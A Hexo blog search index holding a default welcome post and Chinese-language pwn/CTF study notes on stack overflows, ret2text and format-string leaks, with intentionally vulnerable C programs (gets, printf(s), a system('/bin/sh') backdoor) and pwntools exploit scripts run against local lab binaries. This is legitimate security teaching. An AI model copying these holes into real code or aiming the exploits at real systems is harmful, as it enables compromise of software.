<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2022/05/31/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>pwn学习路线</title>
    <url>/2022/06/01/pwn%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/</url>
    <content><![CDATA[<p>CTFwiki：<a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">https://ctf-wiki.org/pwn/linux/user-mode/environment/</a></p>
<h1 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h1><h2 id="学习pwn需要的环境和工具"><a href="#学习pwn需要的环境和工具" class="headerlink" title="学习pwn需要的环境和工具"></a>学习pwn需要的环境和工具</h2><p>需要安装python的第三方库pwntools、gdb的增强版pwndbg、ruby语言里的Onegadget，其他的工具任意，具体安装步骤在B站的星盟pwn讲学的第一章(pwn环境的搭建)。</p>
<p>ida可以到爱盘(吾爱破解)里面找到</p>
<p>Ubuntu我装的是20</p>
<p><strong>注意：</strong></p>
<p>在自己编译程序的时候，想要关闭一些保护，方法如下：</p>
<p><strong>NX</strong>	<code>-z execstack</code> &#x2F; <code>-z noexecstack</code> (关闭 &#x2F; 开启)  不让执行栈上的数据，于是JMP ESP就不能用了</p>
<p><strong>Canary</strong>	<code>-fno-stack-protector</code> &#x2F;<code>-fstack-protector</code> &#x2F; <code>-fstack-protector-all</code> (关闭 &#x2F; 开启 &#x2F; 全开启) 栈里插入cookie信息</p>
<p><strong>PIE</strong>	<code>-no-pie</code> &#x2F; <code>-pie</code> (关闭 &#x2F; 开启)  地址随机化，另外打开后会有<em>get_pc_thunk</em></p>
<p><strong>RELRO</strong>	<code>-z norelro</code> &#x2F; <code>-z lazy</code> &#x2F; <code>-z now</code> (关闭 &#x2F; 部分开启 &#x2F; 完全开启) 对GOT表具有写权限</p>
<p>如果不想把一些危险的函数进行优化，可以使用 <code>-fno-builtin</code></p>
<p>如果想编译出来的程序是32位的，可以使用 <code>-m32</code></p>
<p>附：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//编译32位出错的话，可以在终端执行如下指令后再进行编译</span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get purge libc6-dev</span><br><span class="line"></span><br><span class="line">sudo apt-get install libc6-dev</span><br><span class="line"></span><br><span class="line">sudo apt-get install libc6-dev-i386</span><br></pre></td></tr></table></figure>

<p>编写源码的初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span> &#123; </span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="用户模式"><a href="#用户模式" class="headerlink" title="用户模式"></a>用户模式</h2><h3 id="栈利用"><a href="#栈利用" class="headerlink" title="栈利用"></a>栈利用</h3><h4 id="栈介绍以及栈溢出原理"><a href="#栈介绍以及栈溢出原理" class="headerlink" title="栈介绍以及栈溢出原理"></a>栈介绍以及栈溢出原理</h4><p>在数据结构里面第一次接触到栈，栈和队列不一样，栈的数据结构是先进后出(FILO)，c++的STL库里也为我们提供了stack这种数据容器，栈的操作主要是入栈(压栈)和出栈。</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202203290800134.png" alt="栈的结构" style="zoom:67%;" />

<p>在汇编语言(可以看看B站里小甲鱼讲的)里面有一个专门定义栈的段(栈段)，可以看到，程序中栈的地址空间是从高地址向低地址增长(预设好栈的空间)。</p>
<p>注意：x86(32)和x64(64)程序的区别</p>
<p><strong>x86</strong></p>
<p>函数参数在函数返回地址的上方</p>
<p><strong>x64</strong></p>
<p>1、前6个整数或指针参数依次保存在<strong>rdi、rsi、rdx、rcx、r8、r9</strong>寄存器中，再多的话放到栈上</p>
<p>2、内存地址不能大于<strong>0x00007FFFFFFFFFFF</strong>，<strong>6个字节长度</strong>，否则抛出异常</p>
<p><strong>栈是如何通过溢出造成漏洞？</strong></p>
<p>向栈中某个变量写入的字节长度&gt;变量申请的字节长度，进而导致改变与其相邻的栈中的变量的值。</p>
<p>想要造成栈溢出，至少需要满足：1、必须向栈上写入数据	2、允许写入的数据大于变量申请的空间</p>
<p><strong>使用一个例子(ret2xxx)</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -fno-stack-protector -no-pie stack.c -o stack </span></span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204032358943.png" alt="image-20220403235858877" style="zoom:80%;" />

<p>看到<strong>gets</strong>和<strong>puts</strong>函数，简直是标配的ret2xxx，32位的传参顺序如上，直接用脚本了(需要安装第三方库pwntools)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span>		<span class="comment">#也可以直接使用pwntools中的函数自动查询，success_addr=elf.sym[&#x27;success&#x27;]</span></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="built_in">print</span> p32(success_addr)</span><br><span class="line"><span class="comment"># 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>栈溢出的总结</strong></p>
<p>利用一些危险的函数，确定程序是否有溢出及其位置，一些常见的危险函数如下：</p>
<p><strong>input：</strong>gets(直接读取一行，忽略’\x00’)、scanf、vscanf</p>
<p><strong>output：</strong>sprintf</p>
<p><strong>string：</strong>strcpy、strcat、bcopy</p>
<p><strong>对于填充的长度</strong></p>
<p>ida一打开对于字符串数组变量的长度，一般看ebp就知道了，还有一些变量是直接地址索引的，相当于直接给出地址</p>
<h4 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h4><p><strong>ROP 是啥呢</strong></p>
<p>ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p>
<p>这类题目一般开启NX保护</p>
<p>ROP攻击一般需要满足一些条件：</p>
<p>1、程序存在溢出，并且考研控制返回地址</p>
<p>2、可以找到满足条件的gadgets以及相应gadgets地址</p>
<h5 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h5><p>ret2text即控制程序本身已经有的代码 (.text)。</p>
<p>示例源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//name:stack01.c</span></span><br><span class="line"><span class="comment">//gcc -m32 -no-pie -z noexecstack -fno-stack-protector -z lazy stack01.c -o stack01</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Congratulations,you find it!&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">  	<span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line"> 	gets(s);</span><br><span class="line">  	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span> </span><br><span class="line">&#123; </span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	init();</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Hello,ctfer!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Can you find backdoor?&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s sign in!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Give me your choice:&quot;</span>);</span><br><span class="line">	vulnerable();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到满足栈溢出的条件(有gets函数)，同时，在代码段里面，看到了调用了system(“&#x2F;bin&#x2F;sh”)</p>
<p>检查保护</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041004930.png" alt="image-20220404100423876" style="zoom:80%;" />

<p>看看ida里面反汇编</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041007160.png" alt="image-20220404100757120" style="zoom:80%;" />

<p>gets函数明显存在栈溢出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">填充的长度:junk=b&#x27;a&#x27;*(0x14+4)		#如果是64位就加8</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041009646.png" alt="image-20220404100938611" style="zoom:80%;" />

<p>哦吼，直接让gets函数的返回地址改为backdoor不就好了</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span>		<span class="comment">#设置运行的py等级为调试</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=remote(,)					#这里没有放到服务器上，打本地就行了</span></span><br><span class="line">io=process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">4</span>)</span><br><span class="line">backdoor=elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]	<span class="comment">#利用pwntools自带的函数查询backdoor地址</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041014085.png" alt="image-20220404101444024" style="zoom:80%;" />

<h5 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h5><p>原理：控制程序执行shellcode</p>
<p><strong>什么是shellcode?</strong>	答：用于完成某个功能的汇编代码。</p>
<p>对于做题而言，一般我们需要填充一些可执行的代码。这类题目一般需要两个前提，即存在栈溢出，且填充的shellcode所在的区域有可执行的<strong>权限</strong>。</p>
<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><h4 id="定义-wiki"><a href="#定义-wiki" class="headerlink" title="定义(wiki)"></a>定义(wiki)</h4><p>格式化字符串（英语：format string）是一些程序设计语言的输入&#x2F;输出库中能将字符串参数转换为另一种形式输出的函数(学过c语言容易理解)。通俗的说，就是把计算机存储的相关数据变成人们可以看懂的字符串形式。</p>
<p>举个例子</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220430190154204.png" alt="image-20220430190154204" style="zoom:80%;" />

<p>格式化占位符的语法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>

<p>其中，parameter可以忽略或者是<code>n$</code></p>
<blockquote>
<p>n是用这个格式说明符（specier）显示第几个参数；这使得参数可以输出多次，使<br>用多个格式说明符，以不同的顺序输出。</p>
</blockquote>
<p>flags可为0或者多个</p>
<blockquote>
<p>重点关注字符’#’</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>意思</th>
</tr>
</thead>
<tbody><tr>
<td>#</td>
<td>对于’ g ‘与’ G ‘，不删除尾部0以表示精度。对于’ f ‘, ‘ F ‘, ‘ e ‘, ‘ E ‘, ‘ g ‘, ‘ G ‘,总是输出小数点。对于’ o ‘, ‘ x ‘, ‘ X ‘, 在非0数值前分别输出前缀0 , 0x , 0X 表示数制。</td>
</tr>
</tbody></table>
</blockquote>
<p>field width表示数值的最小宽度，典型用于制表输出时填充固定宽度的表目</p>
<p>Precision通常指明输出的最大长度，依赖于特定的格式化类型</p>
<p>length指出浮点型参数或整型参数的长度</p>
<p><strong>Type</strong>，也称转换说明，常见的</p>
<blockquote>
<p>%d - 十进制 - 输出十进制整数</p>
<p>%s - 字符串 - 从内存中读取字符串(string)</p>
<p>%x - 十六进制 - 输出十六进制数</p>
<p>%c - 字符 - 输出字符(char)</p>
<p>%p - 指针 - 指针地址(这个经常用)</p>
</blockquote>
<p>在c的代码中，常见的格式化字符串函数有：</p>
<p>输入：scanf</p>
<p>输出：printf、fprintf(目前做的题目碰到printf比较多)</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>攻击的方式很简单，因为printf函数中的相关参数都会从栈上去一个数值视作地址然后去访问，地址可能是不存在或者禁止访问，最后使得程序崩溃掉</p>
<p><strong>举个例子</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//源码</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//name:  pwn.c</span></span><br><span class="line"><span class="comment">//gcc -m32 -fno-stack-protector -no-pie -o pwn pwn.c</span></span><br></pre></td></tr></table></figure>

<p>编译后检查一下保护(编译时候报警告不需要管，就是要对这个危险的函数进行leak的嘛)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/vi0let/文档/pwn/笔记/study/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>跑一下看看(可以使用，-分隔但是不能使用空格会被截断的)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  study ./pwn</span><br><span class="line">%08x,%08x,%08x</span><br><span class="line">00000001.22222222.ffffffff.%08x,%08x,%08x</span><br><span class="line">ffbc1780,f7f03990,080491d1</span><br></pre></td></tr></table></figure>

<p>再使用gdb调试一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  study gdb pwn</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; b <span class="built_in">printf</span></span><br><span class="line">Breakpoint 1 at 0x8049070</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/vi0let/文档/pwn/笔记/study/pwn </span><br><span class="line">%08x,%08x,%08x</span><br></pre></td></tr></table></figure>

<p>可以看到</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220430212855488.png" alt="image-20220430212855488" style="zoom:80%;" />

<p>因为之前已经在程序中对调用printf函数下了断点，所以执行的时候自然就停了下来</p>
<p>明显看到栈上的分布，第一个变量是<strong>返回地址</strong>，第二个变量是<strong>格式化字符串</strong>地址，第三个变量是<strong>a的值</strong>，第四个变量是<strong>b的值</strong>，第五个变量是<strong>c的值</strong>，第六个变量为<strong>我们输入的格式化字符串对应的地址</strong>。</p>
<p>继续调试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">00000001.22222222.ffffffff.%08x,%08x,%08x</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">ffffcfd0,f7ffd990,080491d1[Inferior 1 (process 8801) exited normally]</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220430214716359.png" alt="image-20220430214716359" style="zoom:80%;" />

<p>和上面第一次调用printf类似</p>
<p>同样可以使用**%p,%p,%p**(建议以后使用%p 因为不用考虑位数的问题)，或者**%3$p**在第二次打印的时候打印出第三个参数的地址。</p>
<p>如果参数之间用空格分隔的话(%p %p %p)，会出现这样的情况</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220502192058542.png" alt="image-20220502192058542" style="zoom:80%;" />

<p>这是因为%s格式化字符串会到空格这里截断。</p>
<p>上面的一个例子可以发现</p>
<ul>
<li>%p可以获取对应栈的内存地址</li>
<li>%s可以显示出变量对应的地址的<strong>内容</strong>，但是会有零截断</li>
<li>%n$p获取指定参数的值</li>
</ul>
<p>很显然，%s打印变量内容，而%p表示内存地址，那么就会有一个想法，变量为%p，就会打印出栈上参数对应的地址咯(在上一题的实验也可以看到)</p>
<p>所以可以使用<code>[tag]%p%p%p%p%p%p%p%p%p </code>来打印出其格式化字符串的地址。拿刚才的例子试一下</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220502193248109.png" alt="image-20220502193248109" style="zoom:80%;" />

<p>用aaaa%4$p打印看看(a的ASCII值是0x61)</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220502193443643.png" alt="image-20220502193443643" style="zoom:80%;" />
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
